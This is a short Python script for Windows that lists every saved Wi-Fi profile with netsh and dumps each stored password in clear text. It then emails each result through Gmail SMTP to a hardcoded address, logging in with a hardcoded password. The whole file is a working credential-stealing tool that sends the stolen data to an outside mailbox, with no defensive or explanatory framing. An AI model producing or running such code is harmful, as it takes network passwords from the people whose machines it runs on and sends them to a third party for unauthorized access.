
import subprocess , smtplib,re

def sedmail(email,password,messgae):
    server  = smtplib.SMTP("smtp.gmail.com",587) # google smtp server and its port
    server.starttls() #start tls server
    server.login(email,password)
    server.sendmail(email,email,messgae)
    server.quit()
command ="netsh wlan show profile"
network =subprocess.check_output(command,shell=True).decode("utf-8", "ignore") 
network_name = re.findall("(?:Profile\s*:\s)(.*)",network)   #regular expression to find about all the network through which user ever connected
value = 0
dict = {}
for name in network_name:
  try:
       command2 = "netsh wlan show profile key=clear "+f"{name}"
       out =  subprocess.check_output(command2,shell=True).decode("utf-8", "ignore")
       sedmail("trickybabu981@gmail.com","8580416557",out)
  except:
      print("name is in A A A fromat")
      continue;

